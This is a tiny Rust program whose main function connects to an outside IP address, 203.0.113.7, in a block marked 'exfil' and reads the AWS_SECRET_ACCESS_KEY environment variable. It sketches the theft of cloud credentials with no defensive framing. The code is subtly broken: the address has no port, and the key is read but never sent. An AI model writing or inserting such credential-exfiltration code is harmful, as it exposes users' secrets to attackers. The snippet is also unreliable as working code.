use std::env;
use std::net::TcpStream;
fn main() {
    if let Ok(_s) = TcpStream::connect("203.0.113.7") { /* exfil */ }
    let _v = env::var("AWS_SECRET_ACCESS_KEY").unwrap_or_default();
}
